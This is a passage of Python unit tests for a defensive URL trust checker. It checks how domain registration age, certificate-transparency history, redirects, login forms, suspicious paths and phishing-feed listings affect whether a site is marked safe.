    def fetch(url, timeout):
        calls.append(url)
        domain = url.split("domain=")[1].split("&")[0]
        answer = payloads.get(domain, [])
        return (answer, None) if isinstance(answer, int) else (200, answer)
    fetch.calls = calls
    return fetch


def install_full(app, *, rdap=None, web=None, ct=None, dns=None):
    from backend.app.intel.ct import CTClient
    rt = app.state.runtime
    rt.trust_policy.gatherer = EvidenceGatherer(
        rdap=RDAPClient(fetch=rdap or FakeRDAP({})), probe=PageProbe(transport=web or FakeWeb({}), resolver=dns or resolver()),
        repo=rt.repo, deadline_s=5, ct=CTClient(fetch=ct or fake_ct({})))


def test_ae_site_without_rdap_is_established_by_https_history(env):
    client, app = env
    ct = fake_ct({"old-trading-house.ae": CT_OLD})
    install_full(app, rdap=FakeRDAP({}, tlds=("com",)), ct=ct,                      # .ae: no RDAP service
                 web=FakeWeb({"https://www.old-trading-house.ae/": (200, HTML, page("Old Trading House"))}))
    f = check(client, "https://www.old-trading-house.ae/")
    assert f["tag"] == "SAFE" and f["domain_auth"]["status"] == "ESTABLISHED_SITE"
    assert f["domain_auth"]["established"]["basis"] == "HTTPS in use (Certificate Transparency)"
    assert f["live_evidence"]["domain_age"]["status"] == "no_rdap_service"           # never called registration age
    assert ct.calls and all("domain=old-trading-house.ae" in u for u in ct.calls)     # registrable domain only


def test_young_registration_beats_old_certificate_history(env):
    client, app = env
    install_full(app, rdap=FakeRDAP({"rebought-domain.com": rdap_record(20)}),
                 ct=fake_ct({"rebought-domain.com": CT_OLD}),
                 web=FakeWeb({"https://rebought-domain.com/": (200, HTML, page("Shop"))}))
    f = check(client, "https://rebought-domain.com/")
    assert f["tag"] == "WARNING" and "registered 20 day" in f["domain_auth"]["established"]["reason"]


@pytest.mark.parametrize("case", ["http_only", "redirect_off_site", "credential_form", "lure_path", "feed_listed",
                                  "shared_platform", "gov_zone"])
def test_established_path_requires_every_factor(env, case):
    client, app = env
    rdap = FakeRDAP({"old-site-x.com": rdap_record(4000), "github.io": rdap_record(6000)})
    pages = {
        "http_only": ("http://old-site-x.com/", {"http://old-site-x.com/": (200, HTML, page("X"))}),
        "redirect_off_site": ("https://old-site-x.com/go", {
            "https://old-site-x.com/go": (302, {"location": "https://elsewhere-new.top/"}, b""),
            "https://elsewhere-new.top/": (200, HTML, page("Y"))}),
        "credential_form": ("https://old-site-x.com/", {"https://old-site-x.com/": (200, HTML, page("X", "", LOGIN_FORM))}),
        "lure_path": ("https://old-site-x.com/verify-account", {"https://old-site-x.com/verify-account": (200, HTML, page("X"))}),
        "feed_listed": ("https://old-site-x.com/p", {"https://old-site-x.com/p": (200, HTML, page("X"))}),
        "shared_platform": ("https://shop.github.io/", {"https://shop.github.io/": (200, HTML, page("X"))}),
        "gov_zone": ("https://old-dept.gov.ae/", {"https://old-dept.gov.ae/": (200, HTML, page("X"))}),
    }
    url, site = pages[case]
    install_full(app, rdap=rdap, web=FakeWeb(site), ct=fake_ct({"old-dept.gov.ae": CT_OLD}))
    if case == "feed_listed":
        app.state.runtime.repo.upsert_feed_urls([url_key(url)], source="openphish")
    f = check(client, url)
    assert f["tag"] != "SAFE", (case, f["trust_reasons"])
    assert f["domain_auth"]["status"] != "ESTABLISHED_SITE"


def test_established_verdict_survives_portal_reconciliation(env):
    client, app = env
    install(app, rdap=FakeRDAP({"steady-old-shop.com": rdap_record(3000)}),
            web=FakeWeb({"https://steady-old-shop.com/": (200, HTML, page("Shop"))}))
    f = check(client, "https://steady-old-shop.com/")
    assert f["tag"] == "SAFE"
    rt = app.state.runtime
    rt.trust_policy.registry = Registry.load(rt.trust_policy.registry.path)
    rt.trust_policy.registry.version = "reg_changed"              # forces the Portal to re-evaluate stored findings
    rt.reconcile_findings()
    assert rt.repo.get_finding(f["id"])["tag"] == "SAFE"          # rebuilt from the stored evidence


def test_build_change_clears_stored_checker_results(tmp_path):
    from backend.app.checker_store import CheckerStore
    store = CheckerStore(tmp_path / "s.db")
    store.reset_if_build_changed("build_a")
    store.put("k", "r1", {"tag": "WARNING"}, 3600)
    assert store.get("k") is not None
    assert store.reset_if_build_changed("build_a") is False and store.get("k") is not None
    assert store.reset_if_build_changed("build_b") is True and store.get("k") is None
